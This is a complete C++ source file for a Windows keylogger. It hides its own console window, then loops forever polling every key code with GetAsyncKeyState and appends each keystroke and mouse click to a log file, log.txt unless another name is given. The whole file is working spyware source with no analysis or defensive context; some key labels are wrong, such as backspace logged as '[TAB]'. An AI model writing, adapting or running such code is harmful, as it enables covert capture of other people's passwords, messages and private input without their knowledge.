#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
using namespace std;

void hideConsole(void);
int getLowerKey(int letter);

int main(int nArgs, char* argv[]){
	hideConsole();
	string file;
	if(argv[1] != NULL){
		file = argv[1];
	}
	else{
		file = "log.txt";
	}
	ofstream log;
	log.open(file, ios::out);
	if(log.fail()){
		cout<<"There was a problem when opening the file."<<endl;
		return 0;
	}
	log.close();
	int count = 0;
	bool mayusc = true;
	int chr = 0;
	while(true){
		for(chr=0;chr<=255;chr++){
			if(GetAsyncKeyState(chr) == -32767){
				cout<<chr;
				log.open(file, ios::app);
				switch(chr){
					case 1:log<<"[CLICK IZQUIERDO]";break;
					case 2:log<<"[CLICK DERECHO]";break;
					case 8:log<<"[TAB]";break;
					case 12:log<<"[ALT]";break;
					case 20:
					    if(mayusc){mayusc=false;}
					    else{mayusc=true;}
					break;
					default:
					    if(mayusc){
					    	chr = getLowerKey(chr);
					    }
					    log<<char(chr);
				}
				if(count == 50){
					cout<<endl;
					log<<"\n";
					count = 0;
				}
				else{
					count++;
				}
				log.close();
			}
		}
	}

	return 0;
}

void hideConsole(void){
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	return;
}

int getLowerKey(int letter){
	int low = letter, i= 0;
	string abc ("abcdefghijklmnopqrstuvwxyz");
	string ABC ("ABCDEFGHIJKLMNOPQRSTUVWXYZ");
	for(i;i<26;i++){
		if(ABC[i] == char(letter)){
			low = int(abc[i]);
			break;
		}
	}
	return low;
}